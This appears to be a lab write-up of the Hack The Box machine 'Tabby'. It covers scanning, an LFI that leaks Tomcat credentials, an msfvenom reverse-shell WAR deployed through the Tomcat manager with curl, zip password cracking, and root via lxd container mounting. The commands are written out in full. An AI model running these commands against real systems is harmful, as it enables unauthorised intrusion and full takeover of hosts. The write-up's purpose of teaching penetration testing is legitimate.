# Tabby

### Basic Information
**Machine name:** Tabby  
**IP:** 10.10.10.194  
**Written by:** Adir Biran  
**Tools:** Nmap, Gobuster, msfvenom, zip2john, john, lxd  
**Method:** 

## Enumeration




#### Nmap
*1
<p align="center">
</p>

ports open:
22 - SSH
80 - HTTP
8080 - HTTP

#### Gobuster


gobuster - 80
*2
<p align="center">
</p>

endpoints:
/assets - unreachable
/files - unreachable

gobuster - 8080
*3
<p align="center">
</p>

endpoints:
/docs
/examples
/host-manager
/manager

the website - port 80
*4
<p align="center">
</p>

navigating the checking robots.txt

the website - port 8080
*4-0
<p align="center">
</p>

from the last line, we can see users file is located at /etc/tomcat9/tomcat-users.xml


/docs
*4-1
<p align="center">
</p>

documentation of the apache tomcat, version is 9.0.31.

/examples
*4-2
examples of the apache tomcat.

/host-manager
*4-3
<p align="center">
</p>

requires a login, tried different default credentials found on google but nothing worked.

another line here, indicating the tomcat users file is located in conf/tomcat-users.xml

/manager
*4-4
<p align="center">
</p>

same as host-manager.

continuing on the website on port 80.

adding megahosting to /etc/hosts file
*6
<p align="center">
</p>

the news button leads to something interesting
*5
<p align="center">
</p>

LFI

try basic LFI fails
*7
<p align="center">
</p>

using relative path works
*8
<p align="center">
</p>

user found: ash

lets try to read the credentials for the tomcat's host-manager/manager.
as we saw earlier, the users file is supposed to be located at /etc/tomcat9/tomcat-users.xml.
*9
<p align="center">
</p>

however, seems the file has been moved.
after failed trials, installed the tomcat9 locally using:
sudo apt-get install tomcat9

and located the tomcat-users.xml file:
find / -name tomcat-users.xml 2>/dev/null
*10
<p align="center">
</p>

the second path we tried already, lets try the first one:
/usr/share/tomcat9/etc/tomcat-users.xml
view source to see the content of the xml file.
*11
<p align="center">
</p>

credentials found:
tomcat:$3cureP4s5w0rd123!

with roles: admin-gui, manager-script

trying to get to megahosting.htb:8080/manager and /host-manager with the credentials found.
/manager failed
/host-manager succeed
*12
<p align="center">
</p>

after researching google for a while, found multiple ways to exploit the /manager app but not the /host-manager one.
however, the tomcat user has 2 roles: admin-gui and manager-script.

from the host-manager failed login page, we can see the manager-script role allows for text interface.
meaning, we can try to upload a reverse shell using the text interface.

more information on the roles can be found here:
https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html
*13
<p align="center">
</p>

from the tomcat documentation found on google, we can see how to use the text interface:
https://tomcat.apache.org/tomcat-8.5-doc/host-manager-howto.html

all we need is curl the url: http://10.10.10.194:8080/host-manager/text/{command} with the username and password as mentioned in the documentation.
trying the basic list command from the documentation:
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/host-manager/text/list
*14
<p align="center">
</p>

the host-manager doesn't work, but the /manager does.
*15
<p align="center">
</p>

good.
the next thing is to upload a reverse shell using the command line.

first, let's create the payload as a war file to be deployed by the apache server.
*16
<p align="center">
</p>

msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1234 -f war -o shell.war

as explained in this documentation, we'll use this method to deploy the war file remotely.
*17
<p align="center">
</p>

https://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely

deploying the war remotely:
*18
<p align="center">
</p>

curl -u 'tomcat:$3cureP4s5w0rd123!' -T shell.war http://10.10.10.194:8080/manager/text/deploy?path=/shell

now lets open nc on port 1234 and navigate to 10.10.10.194:8080/shell
*19
<p align="center">
</p>

and we're in as tomcat.

tried to enumerate manually to find ways to escalate privileges before trying linpeas.

sudo -l fails, we don't know the password for tomcat user.

SUID files also didn't induce something useful, as well as the user's groups.

decided to try the /var/www/html directory, as we had earlier paths we couldn't reach (/assets, /files).
*20
<p align="center">
</p>


assets has nothing useful, but files directory does.
*21
<p align="center">
</p>

as the zip file is password protected, we will copy it to our machine and try to crack the password.
*22
<p align="center">
</p>

used zip2john to form the hash:
*23
<p align="center">
</p>

and john to crack the password:
*24
<p align="center">
</p>

password found: admin@it

trying ssh ash with that password failed as it requires the private key.
*25
<p align="center">
</p>

lets try within the reverse shell to switch user to ash with that password.
*26
<p align="center">
</p>

chekcing sudo permission
*27
<p align="center">
</p>

groups
*28
<p align="center">
</p>

as we can see, ash is in lxd group and this is known to be a privilege escalation vector.

following the method mentioned in this article:
https://www.hackingarticles.in/lxd-privilege-escalation/

on the local machine:
git clone  https://github.com/saghul/lxd-alpine-builder.git
*29
<p align="center">
</p>

cd lxd-alpine-builder
./build-alpine

*30
<p align="center">
</p>

and when building is finished, an alpine file will be created.
*31
<p align="center">
</p>

moved the alpine file to the remote machine's /tmp directory using python simple server.
*32
<p align="center">
</p>

however, the process won't work on the /tmp directory due to lack of permissions.
so we will move the alpine.tar.gz file to the /home/ash directory and continue the execution from there.
*33
<p align="center">
</p>

first, initiate the lxd service:
lxd init
*34
<p align="center">
</p>

as we can see, lxd wasn't found because /snap/bin isn't in our path.
let's add it.
export PATH=/snap/bin:$PATH
lxd init (again)
*35
<p align="center">
</p>

lxc image import ./alpine.tar.gz --alias img
*36
<p align="center">
</p>

make sure the image was imported
lxc image list
*37
<p align="center">
</p>

lxc init img ignite -c security.privileged=true
*38
<p align="center">
</p>

lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
*39
<p align="center">
</p>

lxc start ignite
*40
<p align="center">
</p>

lxc exec ignite /bin/sh
*41
<p align="center">
</p>

as some characters are messed up, but root is a root.
*42
<p align="center">
</p>

the mounted image is located in /mnt/root.
